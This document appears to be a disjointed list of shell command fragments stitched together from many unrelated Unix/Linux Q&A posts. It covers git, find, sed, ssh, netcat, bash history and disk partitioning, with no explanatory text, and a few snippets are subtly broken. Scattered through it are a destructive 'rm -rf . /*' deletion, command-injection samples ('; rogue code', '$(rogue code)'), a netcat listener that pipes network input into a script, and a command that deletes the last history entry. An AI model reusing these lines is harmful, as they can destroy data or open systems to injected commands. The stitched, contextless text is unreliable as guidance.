man git-log
git commit
source ./vars.sh
export -n name
name=value; something
env b-b=1 env
b-b=1 env
export name=value
name=value something
source vars.sh
name=value something
git commit -am 'commit'
THE_TIME="$THE_TIME" something
export GIT_AUTHOR_DATE=$THE_TIME
GIT_AUTHOR_DATE=$THE_TIME something
env GIT_AUTHOR_DATE=$THE_TIME something
docker build
docker run
cat file
curl http://some.url/
: start
b start
b ready
: ready
private = 192\.168\.1\.1
/./ P
: ready
private = 192.168.1.1
private = 192.168.1.1
/usr/bin/gnome-session' script again a login shell causes bash to process 
and my
-b 0
-b 0 -i
zsh: command not found: lessc
sudo apt install less
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
model.epoch0.tlt, model.epoch1.tlt, ... model.epoch<n>.tlt
ln -s model.epoch<n>.tlt model.tlt
ln -s /opt/<client>/app/ai/training/<uuid>/models/model.epoch<n>.tlt /opt/<client>/app/ai/training/<uuid>/models/model.tlt
ln -s model.epoch<n>.tlt model.tlt
man user@.service
touch file\ with\ space{001..010}.txt
touch file{001..010}.txt
brew install coreutils
which realpath
f=$(/usr/local/bin/realpath "$f")
rerun -v "myscript.sh"
"04. Somebody\'s Watching Me \(Single Version\).flac: No such file or directory"
{.}".suffix with spaces.flac"
--colsep ' '
export PS1="\e[43;39m[\t]\w\r\n[\u@\h]\\$\e[40m \[$(tput sgr0)\]"
Ubuntu 20.04 LTS
"curl –connect-timeout 10 http://$DASHCAM_IP/blackvue_vod.cgi | sed 's/^n://' | sed 's/F.mp4//' | sed 's/R.mp4//' | sed 's/,s:1000000//' | sed $'s/\r$//' | grep 'Record' | sort -u"; do
C:\Program Files\ScreenFetch
C:\Program Files\ScreenFetch\screenfetch.bat
C:\Program Files\ScreenFetch\dupa.bat
nc -lp $port
echo test | nc localhost $port
nc -lp $port | ./a.sh
localhost [127.0.0.1] 2012 (?) : Connection refused
find (GNU findutils) 4.7.0
GNU bash, version 5.0.17
find -regextype help
valid types are ‘findutils-default’, ‘ed’, ‘emacs’, ‘gnu-awk’, ‘grep’, ‘posix-awk’, ‘awk’, ‘posix-basic’, ‘posix-egrep’, ‘egrep’, ‘posix-extended’, ‘posix-minimal-basic’, ‘sed’
SPEFICIC LOG MESSAGE
tail … | grep …
(tail … &)
declare -x
find . | grep
fc -e -
tr -d \\n
brew install fpp
prefix F
export PRIVATE_KEYS_PATH= "<Some_Path>"
echo $PRIVATE_KEYS_PATH
-fill {COLOR}
-fuzz ...
-fill ...
-opaque ...
echo [1-1]
pgrep -f
read line
urxvt -e command args...
IFS= 
-r -d $'\0')
bash -t
bash -t
bash --rcfile ~/.single_command_bashrc
set -e
bash --rcfile ~/.single_command_bashrc
konsole -e bash --rcfile …
echo foo | grep bar
man find
man termifo
man setterm
find -printf
tput bold
highlight -f
printf '%s\n' ${!A[[:alnum:]]*}
quasar dev
ls -a
alias mover=". $HOME/mover.sh"
alias mover=". ~/mover.sh"
echo "abcde" | sed 's/.*/x/'
echo "" | sed 's/.*/x/'
echo "-a" | sed 's/.*/x/'
echo "-n" | sed 's/.*/x/'
hexdump -cx
echo a
cat subtitle1.srt > srt.pipe & cat audio1.mp3 > audio.pipe
cat subtitle2.srt > srt.pipe
cat audio2.mp3 > audio.pipe
man test
man bash
cat > somefile
more > somefile
cp /dev/tty somefile
cat /dev/tty > somefile
cp /dev/stdin somefile
cat > somefile
ffmpeg -stream_loop -1 -i input.m4v -stream_loop -1 -i audio -c:v copy -t 10800 complete3h.mp4
cp *
find /a_long_path_2 /a_long_path_3 -size 12345c -iname \*.doc
find …
find /a_long_path_2 /a_long_path_3 -size 12345c -iname \*.doc
-exec cmp -s /a_long_path_1/foo.doc {} \; -print
cmp -s
-iname \*.doc
-type f
-size 12345c
(uname -r)
$(uname -r)
history -a && history -d $(history 1 | awk '{print $1}')
sudo -u someuser USERNAME=abc PASSWORD=xyz /path/to/script/bashscript argument1 argument2
help bind
bind -v
sudo apt install yubikey-luks
main.py integerInput integerInput
main.py 5 5
 alias runner='. ~/runner.sh
runner 5 5
parted /dev/sda mklabel gpt
parted /dev/sda mklabel msdos
parted /dev/sda set 1 bios_grub on
find /local/directory/path -mtime +10 -exec rsync {} username@serverhost:/server/directory/path
find: missing argument to -exec
find /local/directory/path -mtime +10 -exec rsync {} username@serverhost:/server/directory/path \;
cmd + T
ls -1 SNPsplit_HS_* | wc -l
rm -rf ./*
rm -rf *
rm -rf ./*
rm -rf . /*
rm -rf ./*
rm ./-i
rm -rf . /*
rm -rf
python3 name_of_the_script.py
python3 name_of_the_script.py
-type f
-exec test -f "$reference"/{} \;
-exec … ;
-exec cmp -- {} "$reference"/{} \;
-exec rmdir -- {} \;
sh -c 'some shell code' sh
/usr/bin/pdfgrep '4022 622 48402' ../testdir/'4022 622 48402 - B263486P010 DY 2022-8-22.pdf'
'-p '
"- "
history -sp
actual command(s)
man 1 entr
sh -c
actual command(s)
sh -c
; rogue code
'; rogue code
'$(rogue code)
ps aux  | awk '{print $6/1024 " MB\t\t" $11}'  | sort -n
ssh username@ip -v /bin/bash -c "echo <(cat)"
rm /etc/profile.d/nano.sh
echo $RANDOM | sha256sum
echo $RANDOM
echo $RANDOM
exec zsh
cd mydir
ls -latr | grep mydir
chmod -R 755 mydir
cd mydir
history -w
history -a
history -...
history -r
history -w
history -a
read -r files
read confirm
read -r files
read confirm
read -r files
ssh -vvv pi@mypi
ssh pi@mypi sudo pstree
ssh -vvv pi@mypi bash -x
